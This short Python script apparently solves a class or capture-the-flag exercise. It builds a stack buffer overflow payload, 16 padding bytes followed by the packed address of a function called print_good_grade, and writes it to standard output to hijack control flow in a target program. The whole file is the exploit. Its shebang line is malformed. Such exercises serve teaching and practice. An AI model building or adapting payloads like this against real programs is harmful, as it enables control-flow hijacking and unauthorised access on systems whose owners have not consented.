#/bash/bin/python3
import sys
import struct

def exploit_target1():
    offset = 16
    address_of_print_good_grade = 0x08049793
    payload = b'A' * offset
    payload += struct.pack('<I', address_of_print_good_grade)
    #print(payload)
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    exploit_target1()
